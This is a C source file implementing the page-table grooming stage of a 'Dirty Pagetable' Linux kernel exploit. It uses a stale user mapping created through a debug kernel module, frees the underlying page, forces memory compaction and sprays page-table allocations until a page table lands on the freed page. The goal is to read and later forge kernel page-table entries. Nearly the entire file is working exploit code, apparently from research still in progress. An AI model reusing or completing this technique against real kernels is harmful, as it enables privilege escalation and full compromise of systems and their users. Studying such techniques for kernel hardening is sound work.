/*
 * Dirty-Pagetable grooming, option 1: drain unmovable freelist + force a
 * migratetype fallback steal of the freed (movable) page X, so an unmovable
 * pte-page allocation lands on X. We still hold a stale user mapping (`p`) to
 * X, so once it's a pte-page we can read (and later forge) kernel PTEs.
 *
 * Plan:
 *   1. Pin to one CPU (free + reuse share a pcp list).
 *   2. Pre-fill movable memory so few movable free pages remain besides X,
 *      making X a prime order-0 fallback-steal target.
 *   3. Establish the deterministic stale PTE, punch X out of its memfd -> X is
 *      a lone movable free page.
 *   4. Spray pte-pages cheaply: map a pre-cached SHARED memfd at many fresh
 *      addresses and fault them. Each mapping needs its own leaf pte-page
 *      (UNMOVABLE) but reuses cached data pages (no competing movable alloc).
 *      This drains the unmovable freelist; the fallback then steals a movable
 *      pageblock -- ideally X's -- and hands X back as a pte-page.
 *
 * Honest detection: scan the stale mapping for PTE-shaped u64s. The LKM oracle
 * is printed only as dev-time ground truth.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>

#define ONE_MB   0x100000UL
#define SZ       (2 * ONE_MB)
#define MAGIC_A  0xaaaaaaaau
#define MAGIC_B  0xbbbbbbbbu
#define MAGIC_F  0xf00df00du     /* spray file marker; its pfns show up in PTEs */
#define DBG      "/sys/kernel/debug/dropwrite/"

#define PREFILL_MB   128         /* shrink movable free pool, leave room for PTs */
#define SPRAY_MAPS   60000       /* pte-page mappings to attempt (OOM-breaks earlier) */
#define SPRAY_TOUCH  64          /* pages faulted per mapping (1 pte-page, 64 set-PTEs) */
#define SCAN_EVERY   256         /* scan cadence */

static int mk(const char *name, uint32_t magic)
{
	int fd = memfd_create(name, 0);
	if (fd < 0 || ftruncate(fd, SZ)) { perror("memfd"); return -1; }
	for (off_t o = 0; o < SZ; o += 0x1000) {
		lseek(fd, o, SEEK_SET);
		if (write(fd, &magic, 4) != 4) { perror("write"); return -1; }
	}
	return fd;
}

static int wr(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);
	if (fd < 0) { perror(path); return -1; }
	int n = write(fd, val, strlen(val));
	close(fd);
	return n < 0 ? -1 : 0;
}

static void print_oracle(const char *tag)
{
	char buf[256];
	int fd = open(DBG "state", O_RDONLY);
	if (fd < 0) { printf("  [oracle %s: n/a]\n", tag); return; }
	int n = read(fd, buf, sizeof buf - 1);
	close(fd);
	if (n > 0) { buf[n] = 0; printf("  [oracle %s] %s", tag, buf); }
}

/* honest detector: count PTE-shaped entries (present|user, plausible pfn) */
static int count_ptes(volatile uint64_t *page)
{
	int hits = 0;
	for (int i = 0; i < 512; i++) {
		uint64_t e = page[i];
		uint64_t pfn = (e >> 12) & 0xffffffffffULL;
		if ((e & 1) && (e & 4) && pfn > 0x100 && pfn < 0x40000)
			hits++;
	}
	return hits;
}

int main(void)
{
	setbuf(stdout, NULL);

	cpu_set_t set; CPU_ZERO(&set); CPU_SET(0, &set);
	if (sched_setaffinity(0, sizeof set, &set)) perror("setaffinity");
	wr(DBG "probe_pfn", "0");

	/* spray source: a shared memfd, cached once so re-mapping it faults in
	 * pte-pages without allocating fresh (movable) data pages. */
	int f = mk("F", MAGIC_F);
	if (f < 0) return 2;
	if (mmap(NULL, SZ, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
		 f, 0) == MAP_FAILED) { perror("cache F"); return 2; }

	/* pre-fill movable memory so X is one of few order-0 movable free pages */
	size_t fill = (size_t)PREFILL_MB * ONE_MB;
	char *filler = mmap(NULL, fill, PROT_READ | PROT_WRITE,
			    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (filler == MAP_FAILED) { perror("prefill"); return 2; }
	madvise(filler, fill, MADV_NOHUGEPAGE);
	for (size_t o = 0; o < fill; o += 0x1000) filler[o] = 1;
	printf("[*] prefilled %d MB movable\n", PREFILL_MB);

	/* victim + deterministic stale PTE */
	int a = mk("A", MAGIC_A), b = mk("B", MAGIC_B);
	if (a < 0 || b < 0) return 2;
	void *res = mmap(NULL, SZ * 2, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (res == MAP_FAILED) { perror("reserve"); return 2; }
	volatile uint64_t *p =
		(void *)(((uintptr_t)res + (SZ - 1)) & ~(uintptr_t)(SZ - 1));
	if (mmap((void *)p, SZ, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_FIXED | MAP_POPULATE, a, 0) == MAP_FAILED) {
		perror("map A"); return 2;
	}
	char armbuf[32];
	snprintf(armbuf, sizeof armbuf, "0x%lx", (unsigned long)p);
	if (wr(DBG "arm", armbuf)) return 2;
	if (mmap((void *)p, SZ - 0x1000, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_FIXED | MAP_POPULATE, b, 0) == MAP_FAILED) {
		perror("remap B"); return 2;
	}
	if (((uint32_t *)p)[0] != MAGIC_A) {
		printf("[-] no stale PTE (0x%08x)\n", ((uint32_t *)p)[0]); return 1;
	}
	printf("[+] stale PTE established\n");

	if (fallocate(a, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE, 0, 0x1000)) {
		perror("punch"); return 2;
	}
	printf("[+] freed X\n");
	print_oracle("post-free");

	/* X is parked on the movable pcp list; fallback steals from the buddy
	 * free area, so flush pcp->buddy. compact_memory drains all pcp lists
	 * and coalesces -- X lands in a movable buddy block (a big coalesced
	 * block is also a prime wholesale steal target). [root-only; a real
	 * unprivileged trigger comes later.] */
	wr("/proc/sys/vm/compact_memory", "1");
	print_oracle("post-compact");

	/* drain unmovable freelist -> force fallback steal of X's movable block */
	for (int k = 0; k < SPRAY_MAPS; k++) {
		char *m = mmap(NULL, SZ, PROT_READ | PROT_WRITE, MAP_SHARED, f, 0);
		if (m == MAP_FAILED) {
			printf("[!] spray mmap failed at k=%d (addr space/mem)\n", k);
			break;
		}
		/* fault a few pages: allocates this mapping's one leaf pte-page
		 * (UNMOVABLE) and sets enough PTEs in it to be recognizable. */
		for (int t = 0; t < SPRAY_TOUCH; t++)
			(void)((volatile char *)m)[t * 0x1000];

		if ((k % SCAN_EVERY) == 0) {
			int n = count_ptes(p);
			printf("k=%6d: first=0x%08x pte-like=%d\n",
			       k, ((uint32_t *)p)[0], n);
			print_oracle("groom");
			if (n > 16) {
				printf("[+] PAGE TABLE IN THE HOLE (%d PTEs)\n", n);
				for (int i = 0; i < 6; i++)
					printf("    pte[%d]=0x%016llx\n", i,
					       (unsigned long long)p[i]);
				return 0;
			}
		}
	}
	printf("[-] no pte-page reclaim within budget\n");
	return 1;
}
